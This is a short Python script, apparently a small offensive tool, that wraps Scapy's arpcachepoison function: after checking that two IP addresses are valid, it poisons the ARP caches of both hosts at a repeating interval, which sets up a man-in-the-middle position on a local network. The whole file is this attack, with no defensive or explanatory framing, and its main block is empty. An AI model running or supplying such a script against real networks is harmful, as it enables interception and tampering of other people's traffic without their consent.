from scapy.all import arpcachepoison, conf
import ipaddress

conf.verb = 0

def arpoison(target1, target2, interval=5):

    try:
        ipaddress.ip_address(target1)
        ipaddress.ip_address(target2)
    except ValueError:
        print("Bad IP address")
        return 1

    arpcachepoison(target1, target2, interval)


if __name__ == '__main__':
    pass
